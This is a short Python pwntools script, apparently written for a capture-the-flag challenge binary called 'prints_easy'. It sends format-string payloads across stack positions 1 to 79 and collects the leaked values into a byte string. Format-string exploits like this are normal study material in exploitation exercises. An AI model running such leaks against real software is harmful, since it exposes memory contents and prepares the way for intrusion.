
from pwn import *
import re
binary = context.binary = ELF('prints_easy')
context.log_level = 'debug'


p = process(binary.path)

leaks_bytes = b''
leaks = {}
for i in range(1, 80):
    p.send(b'AAAA0x%%%d$016zxBBBB' % i)
    a = p.read()
    mat = re.search(b'AAAA(.*)BBBB', a)
    if mat is None:
        continue
    leaked = mat.groups()[0]
    leaks[i] = leaked
    leaks_bytes += p64(int(leaked, 0))

print(leaks_bytes)
